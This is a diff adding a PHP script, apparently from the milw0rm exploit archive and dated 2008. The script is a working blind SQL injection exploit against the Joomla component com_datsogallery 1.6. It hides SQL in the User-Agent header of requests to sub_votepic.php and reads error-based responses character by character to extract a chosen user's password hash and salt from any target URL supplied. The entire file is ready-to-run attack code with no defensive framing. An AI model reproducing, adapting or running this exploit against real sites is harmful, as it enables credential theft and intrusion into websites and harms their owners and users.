@@ -1,0 +1,90 @@
+<?
+//Joomla Component com_datsogallery 1.6 Blind SQL Injection Exploit by +toxa+
+//Greets: all members of antichat.ru & cih.ms 
+
+//options
+set_time_limit(0);
+ignore_user_abort(1);
+$norm_ua='Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14';
+$url=$_GET['url'];
+$where=(!empty($_GET['user']))?"where username='".$_GET['user']."'":'limit 0,1';
+$id=(!empty($_GET['id']))?$_GET['id']:'1';
+
+//functions
+function send_xpl($url, $xpl){
+	global $id;
+	$u=parse_url($url);
+	$req ="GET ".$u['path']."components/com_datsogallery/sub_votepic.php?id=$id&user_rating=1 HTTP/1.1\r\n";
+	$req.="Host: ".$u['host']."\r\n";
+	$req.="User-Agent: ".$xpl."\r\n";
+	$req.="Connection: Close\r\n\r\n";
+	$fs=fsockopen($u['host'], 80, $errno, $errstr, 30) or die("error: $errno - $errstr<br>\n");
+	fwrite($fs, $req);
+	$res=fread($fs, 4096);  
+	fclose($fs);
+	return $res;
+}
+
+function xpl($condition, $pos){
+	global $norm_ua;
+	global $where;
+	$xpl=rand(1,100000)."'),(1,if(ascii(substring((select password from #__users $where),$pos,1))$condition,(select '$norm_ua'),(select link from #__menu)))/*";
+	return $xpl;
+}
+
+//main
+echo '<title>Joomla Component com_datsogallery 1.6 Blind SQL Injection Exploit by +toxa+</title>';
+if(empty($url)) die($_SERVER['SCRIPT_NAME']."?url=[url]&user=[username]&id=[pic_id]\n<br>username&pic_id - optional\n");
+send_xpl($url, $norm_ua);
+
+//get md5
+for($i=0;$i<=32;$i++){
+	$buff=send_xpl($url,xpl('>58', $i));
+	if(preg_match('/Duplicate entry/', $buff)){
+		for($j=97;$j<=102;$j++){
+			if(preg_match('/Duplicate entry/', send_xpl($url, xpl('='.$j,$i)))){ $pass.=chr($j); break; }
+		}
+	} elseif(preg_match('/Subquery returns more than 1 row/', $buff)){
+		for($j=48;$j<=57;$j++){
+			if(preg_match('/Duplicate entry/', send_xpl($url, xpl('='.$j,$i)))){ $pass.=chr($j); break; }
+		}
+	} else {
+		die("exploit failed");
+	}
+}
+
+//check Joomla version
+$test=rand(1,100000)."'),(1,if((select length(password) from #__users $where)=32,(select '$norm_ua'),(select link from #__menu)))/*";
+$buff=send_xpl($url,$test);
+if(preg_match('/Duplicate entry/', $buff)) die($pass);
+
+//separator
+$pass.=':';
+
+//get salt
+for($i=33;$i<=49;$i++){
+	$buff=send_xpl($url,xpl('>58', $i));
+	if(preg_match('/Duplicate entry/', $buff)){
+		$buff=send_xpl($url, xpl('>91',$i));
+		if(preg_match('/Duplicate entry/', $buff)){
+			for($j=97;$j<=122;$j++){
+				if(preg_match('/Duplicate entry/', send_xpl($url, xpl('='.$j,$i)))){ $pass.=chr($j); break; }
+			}
+		} elseif(preg_match('/Subquery returns more than 1 row/', $buff)){
+			for($j=65;$j<=90;$j++){
+				if(preg_match('/Duplicate entry/', send_xpl($url, xpl('='.$j,$i)))){ $pass.=chr($j); break; }
+			}
+		} else {
+			die("exploit failed");
+		}
+	} elseif(preg_match('/Subquery returns more than 1 row/', $buff)){
+			for($j=48;$j<=57;$j++){
+				if(preg_match('/Duplicate entry/', send_xpl($url, xpl('='.$j,$i)))){ $pass.=chr($j); break; }
+			}
+	} else {
+		die("exploit failed");
+	}
+}
+echo $pass;
+
+# milw0rm.com [2008-05-10]
